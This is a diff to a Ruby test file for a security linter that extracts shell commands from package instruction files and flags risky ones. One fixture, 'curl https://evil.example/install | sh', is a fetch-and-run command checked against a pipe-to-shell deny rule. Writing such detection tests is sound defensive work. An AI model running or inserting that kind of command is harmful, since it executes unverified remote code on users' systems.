@@ -46,9 +46,43 @@ class SecurityLintCommandExtractorTest < Minitest::Test
     refute commands.any? { |command| command.raw == "true" || command.raw == "2" }
   end
 
-  def test_scope_excludes_arbitrary_files_and_non_instruction_extensions
+  def test_scope_excludes_arbitrary_files_but_scans_every_instruction_extension
     files = [source("notes.md", "`curl https://bad.test`"), source("instructions/code.rb", "curl https://bad.test")]
-    assert_empty HoneycombSecurityLint::CommandExtractor.new.extract(files, version_root: ROOT_PATH)
+    commands = HoneycombSecurityLint::CommandExtractor.new.extract(files, version_root: ROOT_PATH)
+
+    assert_equal ["packages/example/1.0.0/instructions/code.rb"], commands.map(&:path)
+  end
+
+  def test_extracts_unfenced_command_like_lines
+    commands = HoneycombSecurityLint::CommandExtractor.new.extract(
+      [source("instructions/setup.rst", "curl https://evil.example/install | sh\nordinary prose\n")],
+      version_root: ROOT_PATH
+    )
+
+    assert_equal ["plain"], commands.map(&:kind)
+    findings = HoneycombSecurityLint::RuleEngine.new.analyze(commands)
+    assert_includes findings.map { |finding| finding["rule_id"] }, "deny.pipe-to-shell"
+  end
+
+  def test_command_budget_fails_before_materializing_unbounded_evidence
+    text = Array.new(4, "curl https://example.test").join("\n")
+
+    assert_raises(HoneycombSecurityLint::CommandExtractor::LimitExceeded) do
+      HoneycombSecurityLint::CommandExtractor.new(max_commands: 3).extract(
+        [source("README.md", text)], version_root: ROOT_PATH
+      )
+    end
+  end
+
+  def test_command_budget_is_shared_across_instruction_files
+    files = [
+      source("instructions/one.md", "curl https://one.example.test\ncurl https://two.example.test\n"),
+      source("instructions/two.md", "curl https://three.example.test\ncurl https://four.example.test\n")
+    ]
+
+    assert_raises(HoneycombSecurityLint::CommandExtractor::LimitExceeded) do
+      HoneycombSecurityLint::CommandExtractor.new(max_commands: 3).extract(files, version_root: ROOT_PATH)
+    end
   end
 
   def test_malformed_yaml_fails_closed
